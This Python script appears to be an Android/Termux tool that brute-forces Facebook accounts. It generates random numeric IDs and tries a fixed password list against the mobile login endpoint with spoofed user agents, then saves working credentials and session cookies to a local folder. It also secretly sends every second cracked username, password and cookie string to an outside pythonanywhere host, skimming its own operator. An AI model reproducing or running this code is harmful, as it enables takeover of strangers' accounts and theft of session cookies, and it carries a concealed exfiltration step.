#si6xd
import os
import sys
import re
import bs4
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import time,subprocess,platform,uuid
import random
import base64
import string
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
try:os.mkdir('/sdcard/CRACK')
except:pass
R = '\x1b[1;91m' 
OR = '\033[1;35m'
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
cyan="\033[1;36m"
ugnn = []
redmi=[]
bkas = []
for x in range(1000):
 rr = random.randint
 rc = random.choice
 A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 se = f'{A}{B}{C}{D}'
 if se in redmi:pass
 else:redmi.append(se)
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Jio'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Jio"
                        sim_id+=fbcr
        else:
                fbcr = 'Jio'
                sim_id+=fbcr
except:
        fbcr = "Jio"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']
uge = []    
loop = 0
oks = []
gen = []
logo = (f"""                                        
                               ,--.     
 ,---. ,--.--.  ,--,--.  ,---. |  |,-.  
| .--' |  .--' ' ,-.  | | .--' |     /  
\ `--. |  |    \ '-'  | \ `--. |  \  \  
 `---' `--'     `--`--'  `---' `--'`--' v-1m
                                       
\033[1;97m———————————————————————————————————————————————""")

myid=uuid.uuid4().hex[:5].upper()

def main():
    os.system('clear')
    print(logo)
    code = input(f"{Y}[{W}~{Y}] {G}ENTER 4 DIGUT CODE {W}: ")
    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    #code = random.choice([code1,code2,code3])
    limit = input(f'{Y}[{W}~{Y}] {G}ENTER TOTAL LIMID {W}: ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=80) as Submits:
        os.system('clear')
        print(47*"\x1b[1;97m+") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,'57273200',v,'57575751','57575752']
            Submits.submit(cracker,ids,passlist)

def convert(cookie):
    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
    return(str(cok))

def cracker(ids,passlist):
    global loop,oks,cps,bkas
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            #nip=random.choice(proxsi)
            #proxs= {'http': 'socks4://'+nip}
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(4,13)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Xiaomi Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Xiaomi Redmi Note 9 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            url1 = "https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6a6bad29-cbdb-41c1-9670-3c76e00feb61%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr"                       
            requu1 = session.get(url1)
            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            head = {'Host': 'm.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': f"{len(str(log_data))}",
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6a6bad29-cbdb-41c1-9670-3c76e00feb61%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': us,
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',}                        
            response = session.post(url,headers=head,data=log_data,allow_redirects=False) #proxies=proxs)
            #print(headers)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                xs_value = None
                for part in kuki.split(';'):
                    if part.startswith('xs='):
                        xs_value = part.split('=', 1)[1]
                        break
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        oks.append(ids)
                        break
                    else:
                        bkas.append(user)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{user}|{pas}|{kuki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                           oks.append(ids)
                           break
                else:
                    break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
                open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(f"\nError: {e}");os.system('clear')
        pass

main()
